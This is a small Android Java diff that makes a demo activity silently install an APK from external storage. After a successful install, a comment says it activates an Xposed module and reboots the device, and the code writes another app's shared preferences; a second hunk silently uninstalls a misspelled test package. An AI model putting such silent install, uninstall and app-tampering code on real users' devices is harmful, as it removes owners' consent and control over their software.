@@ -81,7 +81,13 @@ public class SecondActivity extends Activity implements View.OnClickListener {
                 new Thread(new Runnable() {
                     @Override
                     public void run() {
-                        Utils.installSilently(Environment.getExternalStorageDirectory() + "/yyb.apk");
+                        boolean installSilently = Utils.installSilently(Environment.getExternalStorageDirectory() + "/superdemo" + "/superdemo.apk");
+                        Log.d("FileUtil", "installSilently: succeeded-"+installSilently);
+//                      静默安装成功，激活xposed模块，重启设备
+                        if (installSilently) {
+                            Utils.writeOtherAppSpWithFileWriting();
+                        }
+
                     }
                 }).start();
 
@@ -90,7 +96,7 @@ public class SecondActivity extends Activity implements View.OnClickListener {
                 new Thread(new Runnable() {
                     @Override
                     public void run() {
-                        Utils.uninstallSilently("com.tencent.android.qqdownloader");
+                        Utils.uninstallSilently("ccom.test.emptydemo");
                     }
                 }).start();
 
